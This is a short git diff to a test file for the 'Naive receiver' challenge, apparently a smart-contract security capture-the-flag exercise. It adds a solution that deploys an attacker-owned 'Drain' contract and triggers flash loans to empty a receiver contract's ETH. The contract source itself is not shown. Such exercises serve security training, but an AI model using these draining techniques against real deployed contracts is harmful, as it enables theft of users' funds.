@@ -35,7 +35,14 @@ describe('[Challenge] Naive receiver', function () {
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
+        // await attacker.sendTransaction({
+        //     to: this.pool.address,
+        //     value: ethers.utils.parseEther('10')
+        // })
+        const Drain = await ethers.getContractFactory('Drain', attacker);
+        this.drain = await Drain.deploy();
+        await this.drain.flashLoan(this.pool.address, this.receiver.address);
+        // await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
         // All ETH has been drained from the receiver
         expect(
             await ethers.provider.getBalance(this.receiver.address)
